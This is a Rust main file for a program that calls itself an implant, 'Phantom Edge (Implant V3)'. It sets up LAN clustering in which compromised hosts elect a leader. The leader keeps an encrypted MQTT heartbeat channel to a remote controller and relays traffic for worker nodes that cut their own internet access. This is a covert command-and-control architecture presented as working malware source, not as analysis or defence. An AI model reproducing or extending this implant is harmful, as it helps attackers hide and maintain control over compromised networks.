mod client;
mod bootstrapper;
mod modules; // Import new modules

use client::PolyMqttClient;
use modules::election::{ElectionService, NodeRole};
use modules::local_comm::LocalTransport;
use modules::bridge::BridgeService;
use log::{info, error, warn, debug};
use std::collections::HashSet;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use tokio::time::sleep;
use tokio::sync::mpsc;
use tokio::io::AsyncWriteExt;

// Configuration
const DEDUP_TTL: u64 = 600; 

// Deduplication Engine (Preserved)
struct Deduplicator {
    seen: HashSet<u32>, 
    timestamps: Vec<(Instant, u32)>, 
}

impl Deduplicator {
    fn new() -> Self {
        Self {
            seen: HashSet::new(),
            timestamps: Vec::new(),
        }
    }

    fn check_and_add(&mut self, id: u32) -> bool {
        let now = Instant::now();
        self.timestamps.retain(|(t, k)| {
            if now.duration_since(*t).as_secs() > DEDUP_TTL {
                self.seen.remove(k);
                false 
            } else {
                true
            }
        });

        if self.seen.contains(&id) {
            return false; 
        }

        self.seen.insert(id);
        self.timestamps.push((now, id));
        true 
    }
}

#[tokio::main]
async fn main() {
    env_logger::init();
    info!("Phantom Edge (Implant V3) Started - LAN Clustering Mode");

    // 1. Election / Discovery Phase
    let election = Arc::new(ElectionService::new().await);
    let role = election.run_discovery().await;

    match role {
        NodeRole::Leader => run_leader_mode(election).await,
        NodeRole::Worker => run_worker_mode().await,
        _ => error!("Unexpected Role Unbound"),
    }
}

async fn run_leader_mode(election: Arc<ElectionService>) {
    info!("[Modes] Entering LEADER Mode. Connecting to Cloud + Listening for Workers.");

    // Start Election Monitor (background) to defend leadership
    let elec_clone = election.clone();
    tokio::spawn(async move {
        elec_clone.monitor_requests().await;
    });

    // 1. Setup Cloud Connection (Poly-MQTT)
    // Master Key (Shared Secret) - In prod use real key
    let master_key = [0x42; 32]; 
    let swarm_nodes = vec![("127.0.0.1", 1883)]; // TODO: Use Bootstrapper

    // We only use 1 client for Leader in this simplified V2 demo
    // Real V3 has multi-socket, but let's keep it simple for Bridge
    let (ip, port) = swarm_nodes[0];
    let client = Arc::new(PolyMqttClient::new(ip, port, &master_key));
    let client_clone = client.clone();

    // Start Cloud Heartbeat Loop
    tokio::spawn(async move {
        loop {
            let heartbeat = b"HEARTBEAT_LEADER";
            if let Err(e) = client_clone.send_secure_payload(heartbeat).await {
                warn!("[Cloud] Heartbeat Failed: {}", e);
            }
            sleep(Duration::from_secs(30)).await;
        }
    });

    // 2. Setup Bridge (Listen for Workers)
    match LocalTransport::bind_server().await {
        Ok(listener) => {
            let bridge = BridgeService::new(client.clone());
            let bridge = Arc::new(bridge);
            
            loop {
                match listener.accept().await {
                    Ok((stream, _addr)) => {
                        let b = bridge.clone();
                        tokio::spawn(async move {
                            b.handle_worker(stream).await;
                        });
                    }
                    Err(e) => error!("[Bridge] Accept Error: {}", e),
                }
            }
        }
        Err(e) => error!("[Leader] Failed to bind Local Transport: {}", e),
    }
}

async fn run_worker_mode() {
    info!("[Modes] Entering WORKER Mode. Disabling Internet. Connecting to Leader.");

    // Loop to maintain connection to Leader
    loop {
        match LocalTransport::connect_client().await {
            Ok(mut stream) => {
                // Connected to Leader
                info!("[Worker] Connected to Leader. Sending Heartbeats.");
                loop {
                    let msg = b"HEARTBEAT_WORKER";
                    if let Err(e) = stream.write_all(msg).await {
                        error!("[Worker] Failed to write to Leader: {}", e);
                        break; // Reconnect
                    }
                    sleep(Duration::from_secs(10)).await;
                }
            }
            Err(e) => {
                warn!("[Worker] Failed to connect to Leader: {}. Retrying in 5s...", e);
                sleep(Duration::from_secs(5)).await;
            }
        }
    }
}
